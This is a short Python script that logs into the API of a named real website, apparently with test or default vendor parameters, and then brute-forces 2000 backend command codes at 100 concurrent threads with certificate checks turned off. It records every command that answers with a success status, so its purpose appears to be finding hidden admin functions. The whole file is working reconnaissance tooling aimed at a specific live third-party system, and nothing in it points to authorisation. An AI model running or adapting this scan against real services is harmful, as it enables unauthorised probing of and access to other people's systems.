#!/usr/bin/env python3
"""Fast concurrent admin/cmd scan for bf1788.com backend endpoints."""
import requests, urllib3, json, sys
urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://apib63.bf1788.com/boxApi.php"
base = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

# Login first
resp = requests.post(url, data={"cmd": "1000", "wechatId": "testwechat001", **base}, timeout=10, verify=False)
data = resp.json()
sid = data["msg"]["sid"]
print(f"sid={sid[:16]}..., username={data['msg']['username']}")

def test_cmd(cmd):
    params = {"cmd": str(cmd), "sid": sid, **base}
    try:
        r = requests.post(url, data=params, timeout=5, verify=False)
        body = r.text
        if '"status":0' in body or '"code":0' in body:
            return cmd, body[:200]
        return cmd, None
    except:
        return cmd, None

# Scan cmds 1-2000 with high concurrency
found = []
cmds = list(range(1, 2001))
with ThreadPoolExecutor(max_workers=100) as pool:
    futures = {pool.submit(test_cmd, c): c for c in cmds}
    for f in as_completed(futures):
        cmd, result = f.result()
        if result:
            try:
                j = json.loads(result)
                msg = j.get("msg", "")
                if isinstance(msg, dict):
                    info = f"dict keys={list(msg.keys())[:5]}"
                elif isinstance(msg, list):
                    info = f"list[{len(msg)}]"
                elif isinstance(msg, str):
                    info = f"str: {msg[:60]}"
                else:
                    info = str(msg)[:60]
                print(f"  cmd={cmd}: {info}")
                found.append(cmd)
            except:
                print(f"  cmd={cmd}: {result[:80]}")
                found.append(cmd)

print(f"\nTotal found: {len(found)} cmds with success status")
print(f"Cmds: {sorted(found)}")